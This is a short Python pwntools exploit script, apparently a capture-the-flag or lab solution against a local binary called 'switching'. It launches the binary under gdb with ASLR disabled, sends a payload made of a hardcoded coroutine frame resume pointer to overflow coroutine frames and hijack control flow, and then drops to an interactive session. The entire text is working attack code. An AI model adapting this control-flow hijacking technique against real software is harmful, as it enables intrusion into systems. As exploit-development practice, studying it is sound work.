from pwn import *

context.update(arch='x86_64', os='linux')
context.aslr = False
binary = ELF('./switching')
context.binary = binary
#context.terminal = ['bash', '-e']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = gdb.debug('./switching', '''
    b main
    c        
''')

#C1
C1_FRAME_RESUME_PTR = 0x5555555582c0
C1_FRAME_DESTROY_PTR = 0x555555558960


payload_c1 = pack(C1_FRAME_RESUME_PTR)



p.recvuntil("coroutine c1\n")
payload = payload_c1
log.info("Overflowing coroutine frames... payload size: "+str(len(payload)))
p.sendline(payload)


p.interactive()